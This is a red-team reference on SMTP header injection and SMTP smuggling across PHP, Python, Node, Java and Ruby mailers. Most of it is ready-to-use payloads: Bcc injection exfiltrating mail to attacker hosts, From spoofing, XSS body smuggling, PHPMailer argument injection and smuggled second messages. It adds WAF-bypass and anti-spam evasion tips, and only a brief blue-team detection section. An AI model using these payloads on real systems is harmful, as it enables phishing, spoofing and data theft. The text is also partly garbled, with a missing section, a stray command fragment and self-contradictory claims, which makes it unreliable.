# mail-security--p2 — misc

# SMTP Header Injection — Red Team Reference

## 1. Mechanism: how newlines get into the email field

SMTP (RFC 5321) separates headers with `CRLF` (`\r\n`). A header field ends at the first CRLF; anything after it is treated as a new header or the start of the body. The vulnerability appears when user input (from an HTTP form, JSON, etc.) is pasted into an email header without newline sanitization.

**Effective injection characters:**

| Character | Encoding | Effective? | Notes |
|---|---|---|---|
| `\r\n` (CRLF) | `%0d%0a` | Ya | Standar SMTP |
| `\n` (LF) only | `%0a` | Depends on MTA | Postfix normalizes; Exim historically accepts |
| `\r` (CR) only | `%0d` | Rare | Some old parsers (Sendmail <8.13) |
| `\r\n ` (CRLF+SP) | — | Yes | **Folded header** — continuation line, not a new header |
| `\x00` | `%00` | Sometimes | Truncation in C-string parser (PHP mail() pre-7.x) |
| Unicode line sep `U+2028` | — | No | Not interpreted by SMTP |

**Titik masuk umum:**
- `To:`, `Cc:`, `Bcc:`, `From:`, `Reply-To:`, `Subject:` that are built from user parameters
- Display name (`"Name" <a@b.c>`) — injection via the name
- Custom headers (`X-*`) whose value comes from the user

## 2. Impact

### 2.1 Extra recipient (Bcc injection)

```
POST /contact HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

email=victim%40example.com%0d%0aBcc%3Aattacker%40evil.tld&subject=hi&body=x
```

**What the application sends to the MTA:**
```
MAIL FROM:<noreply@app.example.com>
RCPT TO:<victim@example.com>
DATA
From: noreply@app.example.com
To: victim@example.com
Bcc: attacker@evil.tld
Subject: hi

x
.
```

**What shows up:** the email also reaches `attacker@evil.tld`, **without** being visible in the victim's `To` header (because `Bcc:` is stripped by the receiving MTA). Effect: data exfil / spam relay.

**Why it works:** the builder library does not validate newlines, the MTA accepts an additional `Bcc:` from the client.

### 2.2 Header override — ganti From / Reply-To

```
email=victim%40example.com%0d%0aFrom%3Aceo%40bank.co.id%0d%0aReply-To%3Aattacker%40evil.tld
```

**Result:** two `From:` headers (original + injected). Parser behavior differs:
- **Postfix** (default): takes the **first** → injection fails to override, but `Reply-To` succeeds.
- **Exim 4.x**: takes the **last** → override succeeds.
- **Sendmail 8.15+**: reject duplicate `From` bila `check_headers` aktif.

**Business effect:** phishing with a legitimate-domain From, replies routed to the attacker.

### 2.3 Content-Type / body smuggling

```
subject=x%0d%0aContent-Type%3Atext%2Fhtml%3B%20charset%3Dutf-7%0d%0a%0d%0a<img src%3Dx onerror%3Dalert(1)>
```

**Result:** email with a body interpreted as HTML; UTF-7 charset opens an XSS vector in old webmail (Roundcube <1.3.6, Zimbra <8.8.9).

### 2.4 SMTP smuggling (CVE-2023-51764, CVE-2023-51765)

Different from header injection: smuggling **an entire second message** via inconsistent `DATA` termination between MTAs.

```
From: x@a
To: y@b
Subject: legit

<body>\r\n.\r\nMAIL FROM:<a@evil>\r\nRCPT TO:<victim@target>\r\nDATA\r\nSubject: pwn\r\n\r\nx\r\n.\r\n
```

**Vulnerable targets:** Postfix <3.8.4, Sendmail <8.17.2, Exim <4.97, Kerio, Sophos — when in front of a relay with different termination (e.g., SMTP outbound → Exchange Online). The payload needs a `\r\n.\r\n` vs `\n.\n` mismatch between the inbound MTA and the relay.

## 3. HTTP request → email example (end-to-end)

### 3.1 PHP `mail()` — CVE-2016-10033/10045 (PHPMailer <5.2.18)

**Application:**
```php
$mail = new PHPMailer();
$mail->setFrom($_POST['from']);
$mail->addAddress('support@corp.tld');
$mail->Subject = $_POST['subject'];
$mail->Body    = $_POST['body'];
$mail->send();
```

**Request:**
```
POST /submit HTTP/1.1
Host: app.corp.tld
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

from=attacker%40evil.tld%20-X%2Fvar%2Flib%2Fphp%2Fsess_x%20-OQueueDir%3D%2Ftmp&subject=hi&body=x
```

**Why it works:** PHPMailer uses `mail()` with the `-f` param from `setFrom`, does not escape the shell argument → **argument injection** into the `sendmail` binary (not merely header injection). Vulnerable versions: PHPMailer <5.2.18, <5.2.19 (bypass of `escapeshellarg` on Windows).

**Classic header injection in `mail()` (PHP <8.0, before the fix):**
```php
mail($to, $subject, $body, "From: $from");
// $from = "x@a\r\nBcc: attacker@evil.tld"
```
PHP 8.0+ blocks newlines in the `$additional_headers` parameter (`ValueError`), but does **not** block injection via `$to` or `$subject` before 8.0. This is why many PHP "email header injection" CVEs stopped after 7.4 EOL.

### 3.2 Python `smtplib` + manual header

**Rentan:**
```python
msg = f"From: {from_addr}\r\nTo: {to_addr}\r\nSubject: {subject}\r\n\r\n{body}"
smtp.sendmail(from_addr, [to_addr], msg)
```

**Payload:**
```json
{"from_addr":"a@b.c","to_addr":"v@corp.tld","subject":"hi\r\nBcc: attacker@evil.tld","body":"x"}
```

**Result:** `smtplib.sendmail` does **not** validate CRLF until Python 3.12 — Python 3.12+ (`smtplib` 3.12) begins rejecting newlines in the `sendmail()` arguments via a `_quote_periods`-like check? **In fact: no** — `smtplib` still accepts multi-line strings and sends them as-is as DATA. Mitigation must be at the application layer (`email.headerregistry`).

### 3.3 Node.js `nodemailer` <6.4.16 (CVE-2020-12768? — sebenarnya 6.4.16)

Nodemailer since 6.4.16 validates CRLF in the address parser. Versions <6.4.16:
```js
transporter.sendMail({
  from: req.body.from,   // "x@a\r\nBcc: attacker@evil.tld"
  to: 'support@corp.tld',
  subject: 'hi',
  text: 'x'
});
```
→ extra recipient.

### 3.4 Java `javax.mail` (Jakarta Mail <1.6.5 / 2.0.0)

`InternetAddress` pre-1.6.5 accepts `"a@b.c\r\nBcc: x@y.z"` if `strict=false` (the default in many wrappers). Jakarta Mail 2.0.0+ (`org.eclipse.angus:jakarta.mail`) rejects CR/LF in `InternetAddress.parse(strict=true)` — **the default remains `strict=false`** for compatibility, so injection is still possible if the application does not override it.

### 3.5 Ruby `mail` gem <2.8.0

`Mail::Address.new("a@b\r\nBcc: x@y").to_s` → returns a string with CRLF; `Mail::Message` only validates in 2.8.0 (`Mail::Field` raises).

## 5. Quick verification in the lab

**Check whether the MTA accepts an additional Bcc from DATA:**
```bash
printf 'EHLO t\r\nMAIL FROM:<a@t>\r\nRCPT TO:<v@t>\r\nDATA\r\nFrom: a@t\r\nTo: v@t\r\nBcc: x@evil\r\nSubject: t\r\n\r\nbody\r\n.\r\nQUIT\r\n' \
  | nc -w 5 mail.target.tld 25
```

**Check Postfix vs Exim parser against duplicate `From:`:**
```bash
swaks --to v@t --from a@t --header 'From: spoof@evil' \
      --server mail.target.tld --port 25
# Lihat header From yang diterima di mailbox v@t
```

**Deteksi smtp smuggling (payload LF-only terminasi):**
```bash
swaks --to v@t --from a@t --server mail.target.tld \
      --data $'Subject: t\n\nbody\n.\nMAIL FROM:<s@evil>\nRCPT TO:<v2@t>\nDATA\nSubject: pwn\n\nx\n.\n'
```

**Grep the application for vulnerability:**
```bash
# Cari pola concatenation header
grep -rnE '(Subject|From|To|Cc|Bcc):\s*["\x27].*\$_(GET|POST|REQUEST)' --include='*.php' .
grep -rnE 'headers\s*=\s*[`"].*\$\{' --include='*.js' --include='*.ts' .
grep -rnE 'msg\s*=\s*f["\x27].*(From|To|Subject).*\{' --include='*.py' .
```

## 6. Operational pitfalls (that cause failure in the field)

| Pitfall | Why it fails | Workaround |
|---|---|---|
| **Modern framework auto-sanitize** — Laravel `Mail` (Swift/Symfony Mailer), Rails `ActionMailer` (Mail gem ≥2.8), Django `EmailMessage` ≥4.0 | `ValueError`/`InvalidHeaderDefect` before reaching the MTA | Look for a bypass path: injection via the *display name* in `Address` (Rails <7.0), or via `sender` instead of `from` |
| **WAF filter** blocks `%0d%0a` in body/query | Request 403 before the app | Double-encode `%250d%250a` if the app double-decodes; or use a single `\n` (Postfix normalizes it to CRLF) |
| **PHP 8.0+ `mail()`** rejects CRLF in `$additional_headers` | `ValueError` | The vector moves to `$to`/`$subject` **if** the app still uses `mail()` directly; or to the 5th argument `-f` (PHPMailer-style CVE) |
| **Postfix `header_checks` / `smtpd_recipient_restrictions`** rejects an additional Bcc from the client | 550 | Target an MTA that does not inspect headers from the submission port (587 without strict submission config) |
| **Outbound relay** (SendGrid, SES, Mailgun) rewrites headers | Injection disappears | Look for injection on the **inbound side**: "auto-reply", "share", "invite" forms that send only to the internal MTA |
**DKIM/SPF enforcement** at the recipient | Injected emails end up in spam/are rejected even if Bcc reaches | For exfil, Bcc is enough; for phishing, a subdomain with valid SPF/DKIM is needed |
**Webmail HTML strip** — Gmail deletes `<img onerror>` | XSS fails | Look for old webmail (Roundcube <1.3.6) or desktop clients (Thunderbird <78.4?) that parse raw HTML |
**`Content-Type: multipart`** — injection in the middle of a multipart body | MTA treats it as an incorrect boundary → body corrupt | Injection in the header, not the body; or override `Content-Type` before the boundary |
**Homoglyph/unicode space** in folded header | Modern parsers reject | Use tab (0x09) as continuation, not space |
**Exchange Online** normalizes CRLF in transport rules | Smuggling fails | Needs the first hop not to normalize (Postfix <3.8.4 before EOP) |
**App uses transactional SDK** (SendGrid v3 API, SES `SendEmail` JSON) | JSON API does not parse CRLF as a header | Dead vector; look for components that build MIME manually (e.g., SES `SendRawEmail` + template) |
**Rate limit / anti-spam** at the destination MTA | Bcc reaches but is throttled | Small batches (1–5 per minute), rotate source IP |

## 7. Ready-to-use payload artifacts

**Form HTTP → Bcc (URL-encoded):**
```
email=victim%40target.tld%0d%0aBcc%3Aexfil%40attacker.tld
```

**From override (Exim target):**
```
email=victim%40target.tld%0d%0aFrom%3Aceo%40bank.co.id%0d%0aReply-To%3Aexfil%40attacker.tld
```

**Header folding bypass filter naif (`\r\n\t`):**
```
subject=hi%0d%0a%09Bcc%3Aexfil%40attacker.tld
```

**SMTP smuggling (Postfix→EOP, CVE-2023-51764):**
```
EHLO x\r\n
MAIL FROM:<a@attacker.tld>\r\n
RCPT TO:<victim@target.tld>\r\n
DATA\r\n
From: a@attacker.tld\r\n
To: victim@target.tld\r\n
Subject: legit\r\n
\r\n
body\r\n
.\r\n
MAIL FROM:<spoof@bank.co.id>\r\n
RCPT TO:<victim2@target.tld>\r\n
DATA\r\n
Subject: phish\r\n
\r\n
click\r\n
.\r\n

```

```bash
  --data-urlencode 'body=x' -o /dev/null -w '%{http_code}\n'
```

## 8. Detection & regression (for blue team handoff)

- **MTA log audit (Postfix):** `grep -E 'Bcc:.*<.*@' /var/log/mail.log` — Bcc from client submission port (587) not via SMTP AUTH app account = anomaly.
- **Application:** unit test with payload `\r\nBcc:` in every field; assert no new header in MIME output.
- **SIEM rule:** log HTTP POST with `%0d%0a` in the body to the endpoint that triggers the email (regex in WAF log).
- **eBPF / strace:** trace `execve("/usr/sbin/sendmail", ["-f", "...", "-X", ...])` — arguments `-X`/`-O`/`-C` from user input = indication of CVE PHPMailer-class.
